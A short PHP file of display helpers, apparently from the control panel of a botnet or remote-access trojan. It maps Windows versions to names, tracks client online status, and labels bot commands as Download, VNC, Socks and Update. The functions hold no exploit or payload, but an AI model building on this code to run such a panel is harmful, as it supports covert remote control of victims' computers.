<?php

function get_os($majorVer, $minorVer, $server)
{
   if($majorVer == 5)
   {
     if(!$server)
         return 'Windows XP';
      else
        return 'Windows 2003';
   }
   if($majorVer == 6 && $minorVer == 0)
   {
     if(!$server)
         return 'Windows Vista';
      else
        return 'Windows Server 2008';
   }
   if($majorVer == 6 && $minorVer == 1)
   {
     if(!$server)
         return 'Windows 7';
     else
        return 'Windows Server 2008 R2';
   }
   if($majorVer == 6 && $minorVer == 2)
   {
     if(!$server)
         return 'Windows 8';
     else
        return 'Windows Server 2012';
   }
   if($majorVer == 6 && $minorVer == 3)
   {
     if(!$server)
         return 'Windows 8.1';
     else
        return 'Windows Server 2012 R2';
   }
   if($majorVer == 10 && $minorVer == 0)
   {
      if(!$server)
         return 'Windows 10';
      else
         return 'Windows Server 2016';
   }
   else
     return '?';
}


function format_count($count)
{
   global $total_cilents;
   if($total_cilents == 0 && $count == 0)
      $total_cilents = 1;
   return $count;  
}

function is_online($time)
{
   global $CONF_TIMEOUT_OFFLINE;
   return (time() - $time) < $CONF_TIMEOUT_OFFLINE ;
}

function time_since($time)
{
   $time = time() - $time;
   $time = ($time < 1) ? 1 : $time;
   $tokens = array (
      31536000 => 'year',
      2592000  => 'month',
      604800   => 'week',
      86400    => 'day',
      3600     => 'hour',
      60       => 'minute',
      1        => 'second'
   );

   foreach($tokens as $unit => $text)
   {
      if($time < $unit) continue;
      $numberOfUnits = floor($time / $unit);
      return $numberOfUnits.' '.$text.(($numberOfUnits > 1) ? 's' : '').' ago';
   }
}



function get_command_name($type)
{
  
   switch($type)
   {
      case 0:           return 'Download';
      case 1:           return 'VNC';
      case 2:           return 'Socks';
      case 3:           return 'Update';
      default:          return '?';
   }
}
?>
